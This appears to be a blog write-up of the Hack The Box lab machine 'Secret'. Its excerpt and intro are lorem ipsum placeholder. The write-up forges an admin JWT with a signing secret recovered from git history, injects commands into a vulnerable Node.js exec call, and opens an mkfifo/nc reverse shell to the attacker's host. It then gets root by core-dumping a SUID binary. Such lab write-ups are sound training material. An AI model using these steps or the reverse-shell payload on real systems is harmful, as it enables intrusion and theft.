---
layout: single
title: Secret - Hack The Box
excerpt: "Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
date: 2021-11-22
classes: wide
header:
  teaser: /assets/images/htb-writeup-secret/secret_logo.png
  teaser_home_page: true
  icon: /assets/images/linux.png
categories:
  - hackthebox
  - infosec
tags:  
  - linux
  - mysql
  - mattermost
  - hashcat
  - rules
---

![](/assets/images/htb-writeup-secret/secret_logo.png){: style="float: right; width: 200px; margin-left: 2em"}

"Lorem Ipsum is simply dummy text of the printing and typesetting industry. Lorem Ipsum has been the industry's standard dummy text ever since the 1500s, when an unknown printer took a galley of type and scrambled it to make a type specimen book. It has survived not only five centuries, but also the leap into electronic typesetting, remaining essentially unchanged. It was popularised in the 1960s with the release of Letraset sheets containing Lorem Ipsum passages, and more recently with desktop publishing software like Aldus PageMaker including versions of Lorem Ipsum."
<br>

----------------

# USER

### Step 1

**nmap:**
```bash
┌──(void㉿void)-[/htb/secret]
└─$ nmap -Pn -n -sCV 10.10.11.120  
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times will be slower.
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-12 12:36 CET
Nmap scan report for 10.10.11.120
Host is up (0.032s latency).
Not shown: 997 closed ports
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 97:af:61:44:10:89:b9:53:f0:80:3f:d7:19:b1:e2:9c (RSA)
|   256 95:ed:65:8d:cd:08:2b:55:dd:17:51:31:1e:3e:18:12 (ECDSA)
|_  256 33:7b:c1:71:d3:33:0f:92:4e:83:5a:1f:52:02:93:5e (ED25519)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: DUMB Docs
3000/tcp open  http    Node.js (Express middleware)
|_http-title: DUMB Docs
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

**dirb:**
```bash
---- Scanning URL: http://10.10.11.120/ ----
+ http://10.10.11.120/api (CODE:200|SIZE:93)
+ http://10.10.11.120/assets (CODE:301|SIZE:179)
+ http://10.10.11.120/docs (CODE:200|SIZE:20720)
+ http://10.10.11.120/download (CODE:301|SIZE:183)
```

**nikto:**
```bash
+ Server: nginx/1.18.0 (Ubuntu)
```

**ffuf:**
```bash
$ ffuf -c -w /usr/share/wordlists/dirb/big.txt -u http://10.10.11.120/api/FUZZ -fw 12
[... snip ...]
Logs                    [Status: 401, Size: 13, Words: 2, Lines: 1]
logs                    [Status: 401, Size: 13, Words: 2, Lines: 1]
priv                    [Status: 401, Size: 13, Words: 2, Lines: 1]
```

- Download Source Code from the [webpage](http://10.10.11.120/download/files.zip). 

Follow the instructions to the API and create a new user:
```http
POST /api/user/register  HTTP/1.1
Host: 10.10.11.120:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 96

  {
	"name": "player3",
	"email": "player3@dasith.works",
	"password": "Kekc8swFgD6zU"
  }
```

Login to create a JWT:
```http
POST /api/user/login  HTTP/1.1
Host: 10.10.11.120:3000
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Connection: close
Upgrade-Insecure-Requests: 1
Content-Type: application/json
Content-Length: 75

  {
	"email": "player3@dasith.works",
	"password": "Kekc8swFgD6zU"
  }
```
```http
HTTP/1.1 200 OK
X-Powered-By: Express
auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MThlNThiMWE2OTU4OTA0NTc2OThkYTEiLCJuYW1lIjoicGxheWVyMyIsImVtYWlsIjoicGxheWVyM0BkYXNpdGgud29ya3MiLCJpYXQiOjE2MzY3MTg4NzN9.7GR5f0mFU9yXkS0u_KNXYhFYZ3mMoogphUYPjRiVm3w
Content-Type: text/html; charset=utf-8
Content-Length: 213
ETag: W/"d5-fVNaUbvOpMzM3NzFy09qa9PwBE8"
Date: Fri, 12 Nov 2021 12:07:53 GMT
Connection: close

eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MThlNThiMWE2OTU4OTA0NTc2OThkYTEiLCJuYW1lIjoicGxheWVyMyIsImVtYWlsIjoicGxheWVyM0BkYXNpdGgud29ya3MiLCJpYXQiOjE2MzY3MTg4NzN9.7GR5f0mFU9yXkS0u_KNXYhFYZ3mMoogphUYPjRiVm3w
```

Login to verify the account:
```bash
┌──(void㉿void)-[/htb/secret]
└─$ curl -X GET http://10.10.11.120:3000/api/priv -H "Content-Type: application/json" -H "Auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MThlNThiMWE2OTU4OTA0NTc2OThkYTEiLCJuYW1lIjoicGxheWVyMyIsImVtYWlsIjoicGxheWVyM0BkYXNpdGgud29ya3MiLCJpYXQiOjE2MzY3MTg4NzN9.7GR5f0mFU9yXkS0u_KNXYhFYZ3mMoogphUYPjRiVm3w"
{"role":{"role":"you are normal user","desc":"player3"}}
```

------

<br>

### Step 2

Looking in `.git` history we find a token removed "because of security reasons". 

```bash
┌──(void㉿void)-[/htb/secret/files/local-web/.git]
└─$ git show 67d8da7 
commit 67d8da7a0e53d8fadeb6b36396d86cdcd4f6ec78
Author: dasithsv <dasithsv@gmail.com>
Date:   Fri Sep 3 11:30:17 2021 +0530

    removed .env for security reasons

diff --git a/.env b/.env
index fb6f587..31db370 100644
--- a/.env
+++ b/.env
@@ -1,2 +1,2 @@
 DB_CONNECT = 'mongodb://127.0.0.1:27017/auth-web'
-TOKEN_SECRET = gXr67TtoQL8TShUc8XYsK2HvsBYfyQSFCFZe4MQp7gRpFuMkKjcM72CNQN4fMfbZEKx4i7YiWuNAkmuTcdEriCMm9vPAYkhpwPTiuVwVhvwE
+TOKEN_SECRET = secret
```

Go to [JWT.io](https://jtw.io) and paste our created token. In the bottom right corner paste the found token signature (extracted from git) and we'll see `Signature Verified`.

![[Pasted image 20211112141140.png]]

With a verified signature, we can change our username from `player3` to `theadmin`. Take the new auth token and verify that you're now an admin.

```json
┌──(void㉿void)-[/htb/secret/files/local-web/.git]
└─$ curl -X GET http://10.10.11.120:3000/api/priv -H "Content-Type: application/json" -H "Auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MThlNThiMWE2OTU4OTA0NTc2OThkYTEiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InBsYXllcjNAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjM2NzE4ODczfQ.mHuzptCZxArx8xTaM4Hu0ijriDdlY5BA5dPURWjA6Rk"
{"creds":{"role":"admin","username":"theadmin","desc":"welcome back admin"}}
```

--------

<br>

### Step 3
Next we need to figure out how to exploit the use of the admin token. Looking in `routes/private.js` we find something interesting. If we are user `theadmin`, requests will be executed using `exec` - meaning the app is vulnerable to command injection/execution. 

```js
$ cat routes/private.js 

[... snip ...]

router.get('/logs', verifytoken, (req, res) => {
    const file = req.query.file;
    const userinfo = { name: req.user }
    const name = userinfo.name.name;
    
    if (name == 'theadmin'){
        const getLogs = `git log --oneline ${file}`;
        exec(getLogs, (err , output) =>{
            if(err){
                res.status(500).send(err);
                return
            }
            res.json(output);
        })
    }
    else{
        res.json({
            role: {
                role: "you are normal user",
                desc: userinfo.name.name
            }
        })
    }
})
```

Code Execution:
```bash
$ curl -X GET -H "Content-Type: application/json" -H "Auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MThlNThiMWE2OTU4OTA0NTc2OThkYTEiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InBsYXllcjNAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjM2NzE4ODczfQ.mHuzptCZxArx8xTaM4Hu0ijriDdlY5BA5dPURWjA6Rk" "http://secret.htb/api/logs?file=|id"   
"uid=1000(dasith) gid=1000(dasith) groups=1000(dasith)\n" 
```

Create a reverse shell with "**nc mkfifo**":
```bash
$ curl -X GET -H "Content-Type: application/json" -H "Auth-token: eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJfaWQiOiI2MThlNThiMWE2OTU4OTA0NTc2OThkYTEiLCJuYW1lIjoidGhlYWRtaW4iLCJlbWFpbCI6InBsYXllcjNAZGFzaXRoLndvcmtzIiwiaWF0IjoxNjM2NzE4ODczfQ.mHuzptCZxArx8xTaM4Hu0ijriDdlY5BA5dPURWjA6Rk" "http://secret.htb/api/logs?file=rm+/tmp/f%3bmkfifo+/tmp/f%3bcat+/tmp/f|/bin/sh+-i+2>%261|nc+10.10.14.3+4488+>/tmp/f"

$ nc -lvnp 4488
listening on [any] 4488 ...
connect to [10.10.14.3] from (UNKNOWN) [10.10.11.120] 60328
/bin/sh: 0: can't access tty; job control turned off
$ id && hostname
uid=1000(dasith) gid=1000(dasith) groups=1000(dasith)
secret
$ cat user.txt	
a9fd4876fae583bb8625a466208d711f
```

-------------

<br>

# ROOT

### Step 1
Doing a quick manual enumeration with `sudo -l` and looking through some standard directories we find `/opt/count` with the **SUID** bit set. 

```bash
$ ls -al
total 56
drwxr-xr-x  2 root root  4096 Oct  7 10:06 .
drwxr-xr-x 20 root root  4096 Oct  7 15:01 ..
-rw-r--r--  1 root root  3736 Oct  7 10:01 code.c
-rw-r--r--  1 root root 16384 Oct  7 10:01 .code.c.swp
-rwsr-xr-x  1 root root 17824 Oct  7 10:03 count
-rw-r--r--  1 root root  4622 Oct  7 10:04 valgrind.log
```

Playing around with the application, `count`, we can read `/root/root.txt` and when asked to save the count-data to a file we just stop and wait. In theory the data should now be stored in memory and if we some how can **crash** the application maybe we could be able to retreive it.

```bash
dasith@secret:/opt$ ./count 
Enter source file/directory name: /root/root.txt

Total characters = 33
Total words      = 2
Total lines      = 2
Save results a file? [y/N]: 
```

From a second terminal, force a core dump with `kill -11` (SEGV):
```bash
dasith@secret:/opt$ ps aux | grep count
root         779  0.0  0.1 235672  7464 ?        Ssl  09:04   0:00 /usr/lib/accountsservice/accounts-daemon
dasith      3001  0.0  0.0   2488   588 pts/1    S+   13:14   0:00 ./count
dasith      3004  0.0  0.0   6432   736 pts/0    S+   13:15   0:00 grep --color=auto count
dasith@secret:/opt$ kill -11 3001
```
```bash
dasith@secret:/opt$ ./count 
Enter source file/directory name: /root/root.txt

Total characters = 33
Total words      = 2
Total lines      = 2
Save results a file? [y/N]: Segmentation fault (core dumped)
dasith@secret:/opt$ ls -al /var/crash/
total 88
drwxrwxrwt  2 root   root    4096 Nov 22 13:15 .
drwxr-xr-x 14 root   root    4096 Aug 13 05:12 ..
-rw-r-----  1 root   root   27203 Oct  6 18:01 _opt_count.0.crash
-rw-r-----  1 dasith dasith 28049 Nov 22 13:15 _opt_count.1000.crash
-rw-r-----  1 root   root   24048 Oct  5 14:24 _opt_countzz.0.crash
```

<br>

Read the CoreDump and grab the flag.
```bash
dasith@secret:/var/crash$ apport-unpack _opt_count.1000.crash /dev/shm/crash
dasith@secret:/var/crash$ cd /dev/shm/crash/
dasith@secret:/dev/shm/crash$ strings CoreDump

[... snip ...]

/root/root.txt
775db4f3cd0ca47cfb448e1bd5f4dced
```

------

# References
**kill / core dump:**
https://www.techonthenet.com/linux/commands/kill.php
https://stackoverflow.com/questions/6561194/force-a-core-to-dump-from-an-active-normally-running-program-on-freebsd